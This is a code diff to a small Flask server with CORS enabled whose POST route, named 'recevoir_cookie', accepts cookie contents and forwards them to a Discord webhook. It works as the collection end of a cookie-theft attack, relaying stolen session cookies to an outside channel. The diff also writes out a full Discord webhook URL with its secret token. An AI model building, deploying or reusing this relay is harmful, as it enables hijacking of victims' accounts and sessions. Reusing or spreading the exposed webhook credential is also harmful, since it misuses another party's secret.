@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import os
@@ -6,26 +6,27 @@ import os
 app = Flask(__name__)
 CORS(app)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/..."
+WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"
 
 @app.route("/", methods=["POST"])
 def recevoir_cookie():
     data = request.get_json()
     print("🔍 Données reçues:", data)
+    
     if not data or 'content' not in data:
-        return "Bad request", 400
+        return jsonify({"error": "Bad request, 'content' missing"}), 400
 
     cookie_content = data['content']
-    discord_data = { "content": cookie_content }
+    discord_data = {"content": cookie_content}
 
     response = requests.post(WEBHOOK_URL, json=discord_data)
 
     if response.status_code == 204:
         print("✅ Cookie envoyé au webhook Discord")
+        return jsonify({"status": "success"}), 200
     else:
         print(f"⚠️ Erreur envoi webhook Discord: {response.status_code}, {response.text}")
-
-    return "Cookie reçu et envoyé", 200
+        return jsonify({"error": "Discord webhook error"}), 500
 
 @app.route("/", methods=["GET"])
 def accueil():
